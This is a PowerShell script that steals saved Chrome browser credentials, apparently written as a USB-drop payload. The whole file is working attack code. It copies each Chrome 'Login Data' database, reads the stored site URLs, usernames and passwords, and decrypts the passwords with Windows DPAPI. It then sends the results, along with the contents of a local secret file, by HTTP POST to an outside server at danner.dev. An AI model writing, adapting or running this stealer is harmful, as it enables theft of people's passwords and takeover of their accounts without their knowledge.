Add-Type -AssemblyName System.Security # connect database API

$source_path = $MyInvocation.MyCommand.Path | Split-Path -Parent # grab the current script path
$sqlite_lib = $source_path+"\System.Data.SQLite.dll" # sqllite DLL path
Unblock-File $sqlite_lib # unblock DLL file
[void][System.Reflection.Assembly]::LoadFrom($sqlite_lib) # load the DLL
$db_query = "SELECT origin_url,action_url,username_value,password_value,signon_realm  FROM logins" # db query

$user=(Get-WMIObject -Class Win32_ComputerSystem).username -replace '.+\\'  # current logged in user
$paths=Get-ChildItem "C:\Users\$USER\AppData" "Login Data" -Recurse # path to "Login Data" file

# Function to decrypt the password using the win32crypt system implemented by Chrome for encryption
function decrypt_password ($encryptedPassword) {
	$dec_char=[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedPassword.password_value, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
	foreach ($char in $dec_char) { # for each character
		$password+=[Convert]::ToChar($char)	# add data to password until we have the full password
	}
	return $password
}

foreach ($path in $paths) { # iterate through each logindata (if there are more than one)
	$backup=$path.FullName+'_bak' # backup file as chrome holds a lock on the original file
	Copy-Item $path.FullName -Destination $backup -Force -Confirm:$false # copy the file
	$datasource = $backup # set the datasource
	$dataset = New-Object System.Data.DataSet  # create a new dataset
	$dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($db_query,"Data Source=$datasource") # create a new data adapter using the query
	[void]$dataAdapter.Fill($dataset) # fill data into the dataset
	$encryptedData=$dataset.Tables[0] | select signon_realm, username_value, password_value
	foreach ($item in $encryptedData) {
		$item.password_value=decrypt_password -encryptedPassword $item
	}
	Remove-Item $backup
}
$secret = Get-Content -Path ($source_path + "\secret.txt")
$encryptedData = ,$secret + $encryptedData

Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body ($encryptedData|ConvertTo-Json) -ContentType "application/json"
